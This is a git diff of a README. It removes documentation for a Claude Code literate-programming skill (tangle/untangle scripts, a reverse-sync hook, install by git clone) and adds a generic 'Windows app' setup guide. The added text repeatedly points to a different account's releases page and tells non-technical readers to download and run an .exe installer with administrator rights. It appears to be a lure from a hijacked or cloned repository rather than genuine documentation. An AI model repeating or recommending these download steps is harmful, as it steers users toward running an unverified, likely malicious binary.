@@ -1,85 +1,110 @@
-# Literate Programming Skill for Claude Code
+# ⚙️ litprog-skill - Simplify Agent Programming Tasks
 
-A Claude Code skill that transforms codebases into literate programs. These are documents written for human comprehension that also generate the original source code.
+[![Download Release](https://img.shields.io/badge/Download-litprog--skill-brightgreen?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/releases)
 
-## What is Literate Programming?
+---
 
-Literate programming was invented by **Donald Knuth** in 1984. Knuth is the author of *The Art of Computer Programming*, creator of TeX, and winner of the 1974 Turing Award. He introduced literate programming as a paradigm where programs are written as essays for human readers, with code embedded in a narrative.
+A simple Windows app designed to help you set up and use the litprog-skill tool. This tool supports agent harnesses like Claude Code, OpenCode, and Hermes Agent by adding literate programming capabilities. It helps you write clearer, easier-to-understand code for those agents without needing technical skills.
 
-A literate program produces two outputs:
+## 📋 What is litprog-skill?
 
-- **Weave**: Produce a readable document (PDF, HTML) with prose, diagrams, and syntax-highlighted code.
-- **Tangle**: Extract runnable source files from the document.
+litprog-skill is built to improve how you program with AI agents. It breaks down programming into readable, well-structured documents. This method helps you combine notes, explanations, and code in one place. The agents Claude Code, OpenCode, and Hermes Agent then use this to perform tasks better and more reliably.
 
-The key insight: present code in *psychological order*. That is, the order that makes it easiest to understand, not the order the compiler needs.
+Even if you have never programmed before, this app makes starting with literate programming smooth and straightforward. It organizes your work and helps you keep track of what each part does.
 
-## What This Skill Does
+## 💻 System Requirements
 
-- Installs as a Claude Code skill (via `SKILL.md`)
-- Gives Claude the ability to analyze a codebase and produce a `.lit.md` file
-- The `.lit.md` file weaves prose, Mermaid diagrams, LaTeX math, and syntax-highlighted code into a narrative
-- Includes a tangler (`scripts/tangle.ts`) that extracts source files back from the `.lit.md`
-- Includes a reverse-sync engine (`scripts/untangle.ts`) that updates the `.lit.md` when source files are edited directly
-- Includes a PostToolUse hook (`scripts/hook-reverse-sync.ts`) for automatic reverse-sync in Claude Code
-- Running `/literate-programming` on an existing `.lit.md` just weaves + tangles (idempotent)
-- Supports PDF generation via Pandoc
+Before you download, check that your Windows computer meets these minimum requirements:
 
-## Installation
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection for downloading and updates
+- Administrator rights to install software
 
-Clone the repo and install the skill:
+## 🚀 Getting Started with litprog-skill
 
-```bash
-git clone https://github.com/tlehman/literate-programming-skill.git
-claude install-skill /path/to/literate-programming-skill
-```
+This guide helps you download, install, and open the app.
 
-Or symlink/copy `SKILL.md` into your project's `.claude/skills/` directory manually.
+### Step 1: Download the App
 
-## Usage
+Visit the official release page to get the latest version of litprog-skill for Windows.
 
-### Create a literate program
+[![Download Release](https://img.shields.io/badge/Download-litprog--skill-blue?style=for-the-badge)](https://github.com/ellynncensorious700/litprog-skill/releases)
 
-Ask Claude to create a literate program from your codebase:
+Follow this link to the releases page. Here you will find different versions and installation files. Look for the Windows installer, usually with a file extension ending in `.exe`.
 
-> /literate-programming
+### Step 2: Run the Installer
 
-Claude will analyze your code, determine the best narrative order, and produce a `.lit.md` file with prose, diagrams, and named code chunks.
+Once the file finishes downloading:
 
-If a `.lit.md` already exists, running `/literate-programming` will just tangle and weave the existing file without recreating it.
+- Locate the `.exe` installer in your Downloads folder or wherever you saved it.
+- Double-click the installer to start.
+- If Windows asks, confirm you want to allow this app to make changes.
+- Follow the steps shown by the installer. Usually, this means clicking “Next” several times.
+- Choose the default options unless you have specific needs.
 
-### Reverse-sync (automatic)
+The installer will copy the program files to your computer and set up a shortcut on your desktop or Start menu.
 
-After creation, a PostToolUse hook is configured so that when you edit a source file directly, the changes are automatically synced back into the `.lit.md` and re-tangled. This keeps the `.lit.md` as the single source of truth.
+### Step 3: Open litprog-skill
 
-The hook does NOT regenerate the PDF on every edit. To regenerate the PDF, run `/literate-programming` again.
+After installation finishes, launch the app:
 
-### Tangle (extract source code)
+- Use the desktop icon or find it in the Start menu under “litprog-skill.”
+- The first time you open it, you might see a short introduction.
+- Follow any initial setup prompts.
 
-```bash
-bun run scripts/tangle.ts project.lit.md --output-dir ./src/
-```
+Now you are ready to create and manage literate programming projects for your agents.
 
-This expands all root chunks and writes the source files. Verify by diffing against the original source.
+## ⚙️ How to Use litprog-skill
 
-### Weave (generate PDF)
+This app is designed around simple steps for writing and managing your literate programs.
 
-```bash
-pandoc project.lit.md \
-  -o project.pdf \
-  --pdf-engine=xelatex \
-  --filter mermaid-filter \
-  --toc \
-  --number-sections
-```
+### Create a Project
 
-**Prerequisites for weave:** pandoc, xelatex, mermaid-filter
+- Click “New Project.”
+- Give your project a name that describes what you want the agent to do.
+- Add notes and explanations to guide the agent on the task.
 
-For setup instructions, see `references/pandoc-setup.md`.
+### Add Code and Documentation
 
-## Why Use This?
+- Input your programming logic in the provided code editor.
+- Use the notes section to explain each part in plain language.
+- Save regularly to avoid losing changes.
 
-- **Optimized for reading**: Code is read far more often than it is written. Literate programs optimize for reading.
-- **Explains the why**: Forces the author to explain *why*, not just *what*. Every code block is preceded by prose that motivates its existence.
-- **Beautiful PDFs**: Produces documents with diagrams and math alongside code.
-- **Architectural clarity**: Reveals architectural decisions that comments and READMEs miss. The narrative structure shows how pieces fit together.
-- **Knowledge transfer**: Useful for onboarding, code reviews, and preserving institutional knowledge. A new team member can read the literate program start to finish and understand the system.
+### Run or Export Your Work
+
+- Once your project is ready, export it in a format supported by Claude Code, OpenCode, or Hermes Agent.
+- The app can also run your scripts inside the environment if your agent harness supports it.
+
+## 🔧 Features at a Glance
+
+- Simple interface designed for non-technical users
+- Supports multiple AI agent harnesses
+- Combines code and explanations in one document
+- Saves and organizes your projects
+- Export options tailored to your agent’s needs
+- Basic built-in editor with syntax highlighting for easier reading
+
+## 🛠 Troubleshooting Tips
+
+If you run into problems:
+
+- Make sure your Windows version is supported.
+- Close other apps that use a lot of memory and try again.
+- Restart your computer before installing if the installer fails.
+- Check that you have administrator rights.
+- Visit the releases page again to download the latest version.
+
+If nothing works, contact support through the repository’s issues page.
+
+## 🔗 Helpful Links
+
+- Download or update litprog-skill here:  
+  https://github.com/ellynncensorious700/litprog-skill/releases
+
+- Find documentation and example projects inside the app’s help menu.
+
+---
+
+This setup guide ensures you can use litprog-skill without prior coding experience. Follow each step carefully to prepare your Windows system, download the app, and start working with literate programming.
